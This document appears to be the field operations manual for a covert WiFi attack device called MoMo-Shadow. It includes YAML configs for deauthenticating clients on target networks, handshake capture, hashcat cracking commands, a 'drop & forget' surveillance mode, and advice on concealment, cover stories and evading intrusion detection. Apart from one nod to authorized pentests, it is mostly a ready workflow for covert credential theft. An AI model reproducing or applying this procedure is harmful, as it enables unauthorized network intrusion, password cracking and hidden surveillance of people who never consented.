# 🎯 MoMo-Shadow Operations Guide

> Field operations manual for stealth WiFi reconnaissance

---

## 📋 Table of Contents

- [Pre-Mission Checklist](#pre-mission-checklist)
- [Operation Modes](#operation-modes)
- [Field Procedures](#field-procedures)
- [Target Selection](#target-selection)
- [Data Collection](#data-collection)
- [Extraction](#extraction)
- [OPSEC Considerations](#opsec-considerations)

---

## ✅ Pre-Mission Checklist

### Hardware Check

```
□ Battery fully charged (>90%)
□ SD card has sufficient space (>1GB free)
□ External WiFi adapter connected
□ e-Paper display functional
□ Device fits in concealment location
```

### Software Check

```
□ Shadow service running
□ WiFi AP broadcasting
□ Web UI accessible
□ Config file correct
□ Target SSIDs configured (if known)
```

### Configuration

```yaml
# /boot/shadow.yml - Pre-mission config

device:
  name: "op-shadow-01"

autostart:
  enabled: true
  mode: passive      # Start in passive mode
  delay: 30          # 30s delay for concealment

targets:
  ssids: []          # Empty = capture all
  ignore:
    - "My-Phone"     # Your devices
    - "Backup-Hotspot"

display:
  refresh_interval: 120  # Less frequent = less power
  show_password: false   # OPSEC
```

---

## 🎮 Operation Modes

### Mode 1: Passive Reconnaissance

**Use Case**: Initial survey, mapping APs

```
Behavior:
├── Listen only - no packets transmitted
├── Log all APs, clients, probes
├── Maximum stealth
└── Battery: 48-72 hours

Best For:
├── Initial site survey
├── Long-term monitoring
├── Sensitive environments
└── Unknown threat level
```

**Config**:
```yaml
autostart:
  mode: passive
```

### Mode 2: Targeted Capture

**Use Case**: Obtain specific network credentials

```
Behavior:
├── Select target via Web UI
├── Send targeted deauth bursts
├── Capture 4-way handshake
├── Auto-stop on success
└── Battery: 12-24 hours

Best For:
├── Known target network
├── Time-limited access
├── Credential harvesting
└── Authorized pentests
```

**Config**:
```yaml
autostart:
  mode: capture
targets:
  ssids:
    - "Target-Corp-WiFi"
capture:
  deauth_count: 3        # Conservative
  deauth_interval: 2.0   # Spread out
  timeout: 300           # 5 min timeout
```

### Mode 3: Drop & Forget

**Use Case**: Extended covert collection

```
Behavior:
├── Display off (max power save)
├── Silent background logging
├── No WiFi AP (optional)
├── Retrieve data via SD card
└── Battery: 72+ hours

Best For:
├── Extended surveillance
├── Physical access limited
├── Maximum concealment
└── Data retrieval later
```

**Config**:
```yaml
autostart:
  mode: drop
ap:
  enabled: false        # No AP = no RF signature
display:
  enabled: false
```

---

## 📍 Field Procedures

### Deployment Procedure

```
1. PRE-DEPLOYMENT
   ├── Charge device fully
   ├── Configure for mission
   ├── Test WiFi AP connection
   └── Verify config is correct

2. DEPLOYMENT
   ├── Enable device (button/power)
   ├── Wait for startup (30s default)
   ├── Verify display shows status
   └── Conceal device

3. VERIFICATION (Optional)
   ├── Connect to Shadow AP from phone
   ├── Check Web UI shows scanning
   └── Disconnect and leave area

4. MONITORING (Optional)
   ├── Periodic check via WiFi AP
   ├── Don't linger near device
   └── Check battery status
```

### Retrieval Procedure

```
1. APPROACH
   ├── Verify area is clear
   ├── Have cover story ready
   └── Quick retrieval planned

2. RETRIEVAL
   ├── Power off device first
   ├── Wait for clean shutdown
   └── Secure device

3. DATA EXTRACTION
   ├── Remove SD card
   ├── Copy /var/momo-shadow/data/
   ├── Copy /var/momo-shadow/captures/
   └── Wipe device if needed

4. POST-OP
   ├── Export captures to hashcat
   ├── Analyze probe requests
   └── Document findings
```

---

## 🎯 Target Selection

### Via Web UI

1. Connect to Shadow WiFi AP
2. Open `http://192.168.4.1`
3. View Access Points list
4. Click target AP to select
5. Click "Start Capture"

### Via Config File

```yaml
targets:
  ssids:
    - "Exact-SSID-Name"
    - "Corp-*"          # Wildcard supported
  bssids:
    - "AA:BB:CC:DD:EE:FF"
```

### Target Prioritization

```
High Value:
├── Corporate networks (WPA2-Enterprise)
├── Networks with many clients
├── Hidden SSIDs
└── WPA3 networks (for research)

Low Noise:
├── Strong signal (-50dBm or better)
├── Multiple connected clients
├── Active traffic
└── Not in crowded RF environment
```

---

## 📊 Data Collection

### What Shadow Captures

| Data Type | Storage | Export |
|-----------|---------|--------|
| Access Points | SQLite | JSON |
| Clients | SQLite | JSON |
| Probe Requests | SQLite | JSON |
| Handshakes | PCAP | Hashcat 22000 |

### Database Location

```
/var/momo-shadow/
├── data/
│   └── shadow.db      # SQLite database
└── captures/
    └── *.pcap         # Handshake captures
```

### Export Commands

```bash
# Export handshakes to hashcat format
shadow export /var/momo-shadow/captures/*.pcap -o /tmp/hashes/

# Database is standard SQLite
sqlite3 /var/momo-shadow/data/shadow.db ".dump" > backup.sql
```

---

## 📤 Extraction

### Method 1: Web UI Download

1. Connect to Shadow AP
2. Navigate to Handshakes section
3. Download PCAP files

### Method 2: SD Card

```bash
# Mount SD card on your machine
mount /dev/sdb1 /mnt/shadow

# Copy data
cp -r /mnt/shadow/var/momo-shadow/captures/ ./
cp /mnt/shadow/var/momo-shadow/data/shadow.db ./

# Unmount
umount /mnt/shadow
```

### Method 3: SSH (if enabled)

```bash
# SCP captures
scp -r pi@shadow.local:/var/momo-shadow/captures/ ./

# Or rsync for efficiency
rsync -avz pi@shadow.local:/var/momo-shadow/ ./shadow-data/
```

### Post-Extraction Processing

```bash
# Convert PCAP to hashcat format
hcxpcapngtool -o hashes.22000 *.pcap

# Crack with hashcat
hashcat -m 22000 hashes.22000 wordlist.txt

# Check existing potfile
hashcat -m 22000 --show hashes.22000
```

---

## 🔒 OPSEC Considerations

### RF Signature

```
PASSIVE MODE:
├── WiFi adapter in monitor mode
├── No transmitted packets
├── AP broadcasts (if enabled)
└── Detection: Low

CAPTURE MODE:
├── Deauth packets transmitted
├── Can be detected by WIDS
├── Targeted = lower signature
└── Detection: Medium

DROP MODE:
├── No AP broadcast
├── No display RF
├── Minimal signature
└── Detection: Very Low
```

### Physical Security

```
DO:
├── Use inconspicuous enclosure
├── Power from common sources (USB)
├── Have plausible cover story
├── Test concealment beforehand
└── Plan extraction route

DON'T:
├── Label device
├── Use obvious enclosure
├── Leave visible antennas
├── Revisit frequently
└── Access from same location
```

### Digital Security

```
BEFORE MISSION:
├── Generate new AP password
├── Disable SSH if not needed
├── Clear previous data
└── Verify config has no PII

AFTER MISSION:
├── Wipe device if compromised
├── Secure extracted data
├── Clear browser history
└── Document chain of custody
```

### WiFi AP Security

```yaml
# More secure AP config
ap:
  ssid: "AndroidAP"      # Blend in
  password: "r4nd0mP@ss!" # Strong password
  hidden: true            # Don't broadcast
```

---

## 📱 Quick Reference

### Web UI Shortcuts

| Action | URL |
|--------|-----|
| Dashboard | `http://192.168.4.1/` |
| API Status | `http://192.168.4.1/api/status` |
| AP List | `http://192.168.4.1/api/aps` |

### CLI Commands

```bash
# Start with specific mode
shadow run --mode capture

# Check status
shadow status

# Export data
shadow export capture.pcap

# Show config
shadow config --show
```

### Emergency Procedures

```
DEVICE COMPROMISED:
1. Power off immediately
2. Remove SD card
3. Do not power on again
4. Analyze offline

LOW BATTERY:
1. Device auto-shutdowns at 5%
2. Data is preserved
3. Retrieve and charge

CAPTURE TIMEOUT:
1. Auto-returns to passive
2. Check Web UI for status
3. May need manual deauth
```

---

*Last Updated: January 2026*

